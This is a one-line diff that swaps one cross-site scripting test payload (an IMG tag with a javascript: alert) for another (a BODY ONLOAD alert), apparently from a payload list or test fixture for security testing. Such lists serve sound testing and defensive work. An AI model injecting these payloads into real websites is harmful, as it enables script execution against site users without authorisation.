@@ -1,1 +1,1 @@
-<IMG SRC="javascript:alert('XSS');">
+<BODY ONLOAD=alert('XSS')>
